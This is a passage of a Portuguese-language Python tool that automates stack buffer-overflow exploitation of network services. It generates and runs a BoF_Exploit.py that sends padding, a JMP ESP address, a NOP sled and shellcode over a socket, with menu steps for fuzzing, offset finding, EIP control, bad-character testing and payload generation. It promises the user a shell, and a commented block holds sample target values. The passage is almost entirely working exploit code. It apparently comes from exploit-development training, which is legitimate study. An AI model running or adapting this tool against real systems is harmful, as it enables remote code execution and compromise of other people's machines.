        f.write("jmp_esp = '{}'\n".format(jmp_esp))
        f.write("NOP = '\\x90' * 20\n\n")
        f.write(string_payload+"\n\n")
        f.write("buffer = 'A' * int(bytes_sobrescrita) + jmp_esp + NOP + PAYLOAD\n\n")
        f.write("try:\n")
        f.write("   print('\\033[1;33mENVIANDO EXPLOIT...\\033[m')\n")
        f.write("   conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n")
        f.write("   conn.settimeout(5)\n")
        f.write("   conn.connect((host, int(port)))\n")

        if banner == "S": f.write("   resp = conn.recv(1024)\n\n")

        if parametro == "USER": f.write("   conn.send('USER ' + buffer + '\\r\\n')\n")
        elif parametro == "PASS":
            f.write("   conn.send('USER teste' + '\\r\\n')\n")
            f.write("   resp = conn.recv(1024)\n")
            f.write("   conn.send('PASS ' + buffer + '\\r\\n')\n")
        else:
            if parametro == "": f.write("   conn.send(buffer + '\\r\\n\\r\\n')\n")
            else: f.write("   conn.send(parametro + buffer + '\\r\\n\\r\\n')\n")

        f.write("   print('\\033[1;32mSHELLCODE ENVIADO!\\033[m')\n\n")
        f.write("except Exception as erro:\n")
        f.write("   exit(1)\n")

    f.close()

    print("\033[1;32mARQUIVO \033[1;31mBoF_Exploit.py\033[1;32m GERADO COM SUCESSO!! EXECUTANDO EXPLOIT...\n\033[m")
    if os.system("python BoF_Exploit.py") == 0:
        divisao()
        print("\033[1;32mFUTURAMENTE, CASO OS \033[1;31mPARÂMETROS DO ALVO PERMANECAM OS MESMOS\033[1;32m, APENAS EXECUTE O ARQUIVO \033[1;31mBoF_Exploit.py\033[1;32m GERADO PARA CONSEGUIR O SHELL!\033[m")
        divisao()
        input("\033[1;33mPRESSIONE \033[1;32mENTER\033[1;33m PARA RETORNAR AO MENU...\033[m")
    else:
        if pergunta("\033[1;31mOCORREU ALGUM PROBLEMA NO ENVIO DO EXPLOIT! VERIFIQUE SE A APLICAÇÃO ALVO ESTA RODANDO!\033[m") == 1:
            retorno = 1; return
        retorno = 0; return
    retorno = 1; return
# =======================================================================================================================
def teste():
    global retorno
    retorno = 1; return

#INICIO DO MAIN

#DEFINICAO DE VARIAVEIS GLOBAIS
host = port = parametro = banner = crash = bytes_sobrescrita = bad_chars = ""
valor_eip=controle_eip=string_payload=jmp=string=conn = ""
escolha = shellcode = valor = retorno = colunas = linhas = 0

'''host = '192.168.103.0'
port = '9999'
parametro = 'S'
banner = 'S'
crash = 540
bytes_sobrescrita = 523
valor_eip = 527
jmp = '311712F3'
'''
menu = {1:('FUZZY','fuzzy()'),
        2:('VERIFICAR PONTO DE RUPTURA','ruptura()'),
        3:('BYTES PARA SOBRESCREVER O EIP','eip()'),
        4:('VERIFICAR ESPAÇO PARA O SHELLCODE','espaco()'),
        5:('TESTAR BAD CHARS','badchar()'),
        6:('VERIFICAR O CONTROLE DO EIP','controle()'),
        7:('GERAR O SHELLCODE','payload()'),
        8:('EXPLOIT!!!','exploit()'),
        9:('SAIR DO PROGRAMA','exit(0)')}

while int(escolha) != 9:
    clear()
    titulo("SCRIPT BUFFER OVERFLOW")
    for i in range(9):
        if int(escolha) >= i+1: cor = "32"
        else: cor = "37"
        print('[ \033[1;{}m{}\033[m ] {}'.format(cor,i+1,menu[i+1][0]))

    igual = "=" * math.trunc((colunas - len("INFORMACOES SOBRE O ALVO")) / 2)
    sys.stdout.write("\n\n\033[1;32m{}\033[1;37m{}\033[1;32m{}\n\033[m".format(igual, "INFORMACOES SOBRE O ALVO", igual))

    print("IP: \033[1;32m{}\033[m".format(host))
    print("PORTA: \033[1;32m{}\033[m".format(port))
    print("CRASH COM FUZZY: \033[1;32m{}\033[m".format(crash))
    print("PONTO DE RUPTURA: \033[1;32m{}\033[m".format(bytes_sobrescrita))
    print("SOBRESCREVER EIP: \033[1;32m{}\033[m".format(valor_eip))
    print("BAD CHARS: \033[1;32m{}\033[m".format(bad_chars))
    print("CONTROLE DO EIP: \033[1;32m{}\033[m".format(controle_eip))
    print("JMP ESP: \033[1;32m{}\033[m".format(jmp.upper()))

    print("\033[13;0H\033[1;33mESCOLHA UMA OPÇÃO (1 a 9): \033[m\033[13;28H", end="")
    escolha = input("")
    try:
        escolha=int(escolha)
        if escolha == 9:
            print('\n\n\n\n\n\n\n\n\n\n\nBOA SORTE!')
            exit(0)
        else:
            while True:
                exec(menu[escolha][1])
                if retorno == 1:
                    break
                color_menu()
    except Exception as erro:
        print(erro)
        input('\033[1;31mDIGITE APENAS NÚMEROS ENTRE \033[1;32m1\033[1;32m E \033[1;32m9\033[1;32m!\033[m')
        escolha = 0
    except KeyboardInterrupt:
        clear()
        sys.exit(1)
